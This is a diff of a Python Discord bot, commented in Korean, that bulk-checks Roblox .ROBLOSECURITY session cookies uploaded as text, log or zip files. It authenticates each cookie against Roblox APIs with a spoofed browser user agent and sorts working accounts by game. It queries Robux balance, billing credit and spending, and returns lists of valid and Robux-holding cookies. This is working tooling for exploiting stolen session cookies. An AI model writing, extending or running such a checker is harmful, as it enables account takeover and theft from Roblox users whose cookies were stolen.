@@ -24,10 +24,10 @@ MAX_TOTAL = 0                      # 0이면 입력 상한 해제
 MAX_TRX_PAGES = 10                 # 지출 합계 조회 최대 페이지(1p=100건)
 
 # ========================
-# 전역 네트워크(지연 생성: 3.13 호환)
+# 전역 네트워크(지연 생성)
 # ========================
 AIOHTTP_TIMEOUT = aiohttp.ClientTimeout(total=25, sock_connect=5, sock_read=20)
-TCP_CONN: aiohttp.TCPConnector | None = None  # 지연 생성
+TCP_CONN: aiohttp.TCPConnector | None = None
 
 def new_session(cookies=None):
     global TCP_CONN
@@ -57,7 +57,7 @@ COLOR_GREEN = discord.Color.green()
 EM_CUSTOM = {
     "grow": "<:emoji_20:1413786764744720436>",
     "adopt": "<:emoji_19:1413786747921371226>",
-    "brainrot": "<:emoji_18:1413786729718753>",   # 교체 적용
+    "brainrot": "<:emoji_18:1413786729718753>",
     "blox": "<:emoji_17:1413786669001216071>",
     "robux": "<:emoji_11:1411978635480399963>",
 }
@@ -70,18 +70,16 @@ GAME_ICON = {
     "blox_fruits": EM_CUSTOM["blox"],
 }
 
-# 커스텀 이모지 폴백(권한/접근 문제시) — 유니코드로 교체
+# 커스텀 이모지 폴백(권한/접근 문제시)
 GAME_ICON_FALLBACK = {
-    "grow_a_garden": "EMOJI_6",
-    "adopt_me": "EMOJI_7",
-    "brainrot": "EMOJI_8",
-    "blox_fruits": "EMOJI_9",
+    "grow_a_garden": "EMOJI_0",
+    "adopt_me": "EMOJI_1",
+    "brainrot": "EMOJI_2",
+    "blox_fruits": "EMOJI_3",
 }
 def emoji_for_game(key: str) -> str:
     e = GAME_ICON.get(key)
-    if not e or not e.startswith("<"):  # 커스텀 이모지 문법이 아니면 폴백
-        return GAME_ICON_FALLBACK.get(key, "EMOJI_10")
-    return e
+    return e if (e and e.startswith("<")) else GAME_ICON_FALLBACK.get(key, "EMOJI_4")
 
 # 검증 카운트용 커스텀 이모지(총/성공/실패)
 COUNT_EMO = {
@@ -89,15 +87,9 @@ COUNT_EMO = {
     "ok":    "<a:emoji_8:1411690712344301650>",
     "fail":  "<a:emoji_7:1411690688403345528>",
 }
-def em_total():
-    v = COUNT_EMO.get("total") or ""
-    return v if v.strip() else "EMOJI_11"  # 폴백 교체
-def em_ok():
-    v = COUNT_EMO.get("ok") or ""
-    return v if v.strip() else "✅"
-def em_fail():
-    v = COUNT_EMO.get("fail") or ""
-    return v if v.strip() else "❌"
+def em_total(): return COUNT_EMO.get("total") or "EMOJI_5"
+def em_ok():    return COUNT_EMO.get("ok") or "✅"
+def em_fail():  return COUNT_EMO.get("fail") or "❌"
 
 # 처리 시간(이번 청크) 라벨 이모지
 CHUNK_LABEL_EMO = "<a:emoji_21:1413797526993371146>"
@@ -180,7 +172,12 @@ def extract_cookie_variants(s: str):
     m_eq = re.search(r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s;]+)", s)
     if m_eq:
         val = m_eq.group(1).strip()
-        out = val[val.find("|WARNING"):] if "|WARNING" in val else (val[val.find("_|WARNING"):] if "_|WARNING" in val else val)
+        if "|WARNING" in val:
+            out = val[val.find("|WARNING"):]
+        elif "_|WARNING" in val:
+            out = val[val.find("_|WARNING"):]
+        else:
+            out = val
         return val, out
     if len(s) > 50 and " " not in s and "\n" not in s and "\t" not in s:
         if "|WARNING" in s:
@@ -197,7 +194,6 @@ def find_tokens_in_text(text: str):
     for pat in COOKIE_PATTERNS:
         for m in re.finditer(pat, text or ""):
             val = m.group(1).strip()
-            auth = None
             if "|WARNING" in val:
                 auth = val[val.find("|WARNING"):]
             elif "_|WARNING" in val:
@@ -214,7 +210,6 @@ def find_tokens_in_text(text: str):
             out.append((auth, outv))
     return out
 
-# “_|WARNING/|WARNING” 최우선 추출 → 없으면 백업 패턴 사용
 def find_warning_tokens(text: str) -> list[tuple[str, str]]:
     out, seen = [], set()
     for m in re.finditer(r"(_?\|WARNING[^\s\"';]+)", text or ""):
@@ -287,7 +282,7 @@ async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url
                 return 599, {"error": f"{type(e).__name__}: {e}"}
             await asyncio.sleep(min(2 ** tries, 5) + random.random())
 
-# 인증 강화: UA 부착 + 2단계 폴백, 반환 시그니처 유지(ok, err, uid, uname)
+# 인증 강화: UA + 2단계 폴백 (시그니처 유지: ok, err, uid, uname)
 async def check_cookie_once(cookie_value: str):
     UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
@@ -305,7 +300,7 @@ async def check_cookie_once(cookie_value: str):
                 headers={"User-Agent": UA, "Referer": "https://www.roblox.com/"}
             )
             if st2 == 200 and isinstance(data2, dict) and data2.get("Name"):
-                # uid를 못 줄 수 있으므로 None 허용
+                # uid는 못 받을 수 있음
                 return True, None, None, data2.get("Name")
 
             if st1 in (401, 403) or st2 in (401, 403):
@@ -419,13 +414,18 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
 
         # 1) 인증
         auth_results = await bulk_authenticate(part)
-        ok_entries = []
+
+        # 성공 기준: ok면 uid 없어도 성공(파일/카운트 포함)
+        valid_tokens: list[str] = []
+        ok_entries: list[tuple[str, str, int, str]] = []  # uid 있는 계정만 (게임/경제용)
         for (auth, outv), res in zip(part, auth_results):
             ok, err, uid, uname = res
-            if ok and uid:
-                ok_entries.append((auth, outv, uid, uname))
+            if ok:
+                valid_tokens.append(outv)
+                if uid:
+                    ok_entries.append((auth, outv, uid, uname))
 
-        # 2) 게임 판정
+        # 2) 게임 판정 (uid 있는 계정만)
         game_buckets: dict[str, list[str]] = {}
         if ok_entries:
             sem_badge = asyncio.Semaphore(CONCURRENCY_BADGE)
@@ -439,7 +439,7 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
                 for k in keys:
                     game_buckets.setdefault(k, []).append(outv)
 
-        # 3) 로벅스 잔액/전체 지출
+        # 3) 로벅스 잔액/전체 지출 (uid 있는 계정만)
         total_robux_sum = 0
         total_spend_sum = 0
         robux_positive_list: list[str] = []
@@ -459,20 +459,14 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
 
         # 4) 파일 구성
         files: list[discord.File] = []
-        if ok_entries:
-            buf_valid = io.BytesIO(("\n".join(outv for _, outv, _, _ in ok_entries)).encode("utf-8"))
+        if valid_tokens:
+            buf_valid = io.BytesIO(("\n".join(valid_tokens)).encode("utf-8"))
             files.append(discord.File(buf_valid, filename=f"valid_cookies_part{chunk_idx}.txt"))
 
         if robux_positive_list:
             buf_pos = io.BytesIO(("\n".join(robux_positive_list)).encode("utf-8"))
             files.append(discord.File(buf_pos, filename=f"robux_positive_part{chunk_idx}.txt"))
 
-        fn_map = {
-            "grow_a_garden": f"grow_a_garden_part{chunk_idx}.txt",
-            "adopt_me":      f"adopt_me_part{chunk_idx}.txt",
-            "brainrot":      f"brainrot_part{chunk_idx}.txt",
-            "blox_fruits":   f"blox_fruits_part{chunk_idx}.txt",
-        }
         key_to_display = {cfg["key"]: disp for disp, cfg in GAMES.items()}
 
         # ───────── 임베드(정돈된 레이아웃) ─────────
@@ -489,10 +483,17 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
 
         desc = f"[{chunk_idx}] 처리 청크: {fmt_num(len(part))}개"
 
-        ok_color = discord.Color.from_rgb(0, 180, 110)
-        err_color = discord.Color.from_rgb(200, 60, 60)
-        color_pick = ok_color if len(ok_entries) > 0 else err_color
-        title_emoji = "✅" if len(ok_entries) > 0 else "❌"
+        succ_cnt = len(valid_tokens)
+        fail_cnt = len(part) - succ_cnt
+        if succ_cnt > 0 and fail_cnt == 0:
+            color_pick = discord.Color.from_rgb(0, 180, 110)  # 올그린
+            title_emoji = "✅"
+        elif succ_cnt > 0 and fail_cnt > 0:
+            color_pick = discord.Color.from_rgb(230, 150, 20)  # 부분성공
+            title_emoji = "⚠️"
+        else:
+            color_pick = discord.Color.from_rgb(200, 60, 60)   # 전부실패
+            title_emoji = "❌"
 
         emb = discord.Embed(
             title=f"{title_emoji} 파일 검증 결과 (청크 {chunk_idx})",
@@ -507,8 +508,8 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
             name="검증 수",
             value="\n".join([
                 f"{em_total()} 총(누적/전체): {fmt_num(next_done)} / {fmt_num(total_cnt)}",
-                f"{em_ok()} 성공: {fmt_num(len(ok_entries))}",
-                f"{em_fail()} 실패: {fmt_num(len(part) - len(ok_entries))}",
+                f"{em_ok()} 성공: {fmt_num(succ_cnt)}",
+                f"{em_fail()} 실패: {fmt_num(fail_cnt)}",
             ]),
             inline=True
         )
@@ -520,7 +521,7 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
             inline=True
         )
 
-        # 3) 로벅스 요약(제목 이모지 제거, 라인별 로벅스 이모지)
+        # 3) 로벅스 요약
         emb.add_field(
             name="로벅스 요약",
             value="\n".join([
@@ -531,7 +532,7 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
             inline=False
         )
 
-        # 4) 처리 시간(이번 청크만 표시)
+        # 4) 처리 시간
         emb.add_field(
             name="처리 시간",
             value=f"{chunk_emo()} {fmt_sec(elapsed_chunk)}",
@@ -544,12 +545,12 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
         await dm.send(embed=emb, files=files or None)
 
 # ========================
-# 모달(전체 조회) — 즉시 ACK + 파싱 통일 + 불필요 항목 제거
+# 모달(전체 조회) — 즉시 ACK + 파싱 통일
 # ========================
 class TotalCheckModal(Modal, title="전체 조회"):
     cookie = TextInput(
         label="로블록스 쿠키",
-        placeholder="|WARNING… 또는 .ROBLOSECURITY=…",
+        placeholder="_|WARNING… 또는 .ROBLOSECURITY=…",
         style=TextStyle.short,
         required=True,
         max_length=4000
@@ -563,11 +564,11 @@ class TotalCheckModal(Modal, title="전체 조회"):
             pairs = parse_cookies_blob(self.cookie.value)
             if not pairs:
                 return await inter.followup.send(
-                    embed=make_embed("입력 필요", "쿠키를 찾지 못했습니다. “|WARNING…” 또는 “.ROBLOSECURITY=…” 형태로 넣어줘.", color=COLOR_BLUE),
+                    embed=make_embed("입력 필요", "쿠키를 찾지 못했습니다. “_|WARNING…” 또는 “.ROBLOSECURITY=…” 형태로 넣어줘.", color=COLOR_BLUE),
                     ephemeral=True
                 )
 
-            # 여러 줄 붙여넣었을 때 '유효한 첫 쿠키' 자동 선택
+            # 여러 줄이면 '유효한 첫 쿠키' 자동 선택
             def _clean(v: str) -> str:
                 return (v or "").replace("\u200b", "").replace("\ufeff", "").strip()
 
@@ -585,7 +586,7 @@ class TotalCheckModal(Modal, title="전체 조회"):
                     ephemeral=True
                 )
 
-            # 선택된 쿠키로 실제 조회 진행(UA 포함)
+            # UA 포함 인증으로 확정 ID
             UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
             async with new_session(cookies={'.ROBLOSECURITY': valid_cookie}) as s:
@@ -604,7 +605,6 @@ class TotalCheckModal(Modal, title="전체 조회"):
                     st, d = await fetch_json_with_retry(s, "GET", url)
                     return d
 
-                # 경제/프로필/썸네일만
                 robux_task = asyncio.create_task(fj(f'https://economy.roblox.com/v1/users/{user_id}/currency'))
                 credit_task = asyncio.create_task(fj('https://billing.roblox.com/v1/credit'))
                 settings_task = asyncio.create_task(fj('https://www.roblox.com/my/settings/json'))
@@ -664,16 +664,22 @@ class DMFilePromptView(discord.ui.View):
             self.busy = False
             return await dm.send(embed=make_embed("시간 초과", "다시 서버에서 [파일검증] 눌러 시작해주세요.", color=COLOR_BLACK))
 
-        att = msg.attachments[0]
-        await dm.send(embed=make_embed("진행 중", "파일을 받았습니다. 검증을 시작하겠습니다.", color=COLOR_BLACK))
+        atts = [a for a in msg.attachments if a.size > 0]
+        if not atts:
+            self.busy = False
+            return await dm.send(embed=make_embed("첨부 없음", "파일이 비어있어. 다시 올려줘!", color=COLOR_BLACK))
+
+        await dm.send(embed=make_embed("진행 중", f"파일 {len(atts)}개 받음. 처리 시작!", color=COLOR_BLACK))
 
         try:
-            t0 = time.perf_counter()
-            texts, _ = await extract_texts_from_attachment(att)
-            combined = "\n\n".join(texts)
-            await handle_file_check_logic_dm(dm, combined)
-            t_total = time.perf_counter() - t0
-            await dm.send(embed=make_embed("전체 처리 완료", f"{chunk_emo()} 총 처리 시간: {fmt_sec(t_total)}", color=COLOR_BLACK))
+            for att in atts:
+                t0 = time.perf_counter()
+                texts, _ = await extract_texts_from_attachment(att)
+                combined = "\n\n".join(texts)
+                await handle_file_check_logic_dm(dm, combined)
+                t_total = time.perf_counter() - t0
+                await dm.send(embed=make_embed("개별 파일 처리 완료", f"{chunk_emo()} {att.filename} • {fmt_sec(t_total)}", color=COLOR_BLACK))
+            await dm.send(embed=make_embed("메시지 내 모든 파일 처리 완료", "요청한 모든 첨부 처리 끝!", color=COLOR_BLACK))
         except Exception as e:
             await dm.send(embed=make_embed("처리 실패", f"{type(e).__name__}: {e}", color=COLOR_BLACK))
         finally:
@@ -707,7 +713,7 @@ class CheckView(View):
 class MyBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.default()
-        intents.message_content = True  # DM 이벤트 안정 수신
+        intents.message_content = True
         super().__init__(command_prefix=".", intents=intents)
 
     async def setup_hook(self):
@@ -753,7 +759,7 @@ async def file_check(inter: Interaction):
         dm = await inter.user.create_dm()
         await dm.send(embed=make_embed(
             title="파일 검증",
-            desc="여기에 파일을 올려주세요.\n- 지원 파일: txt / log / csv / json / zip\n- \n- 제한: 2분 내 업로드",
+            desc="여기에 파일을 올려주세요.\n- 지원 파일: txt / log / csv / json / zip\n- 제한: 2분 내 업로드",
             color=COLOR_BLACK
         ))
     except Exception as e:
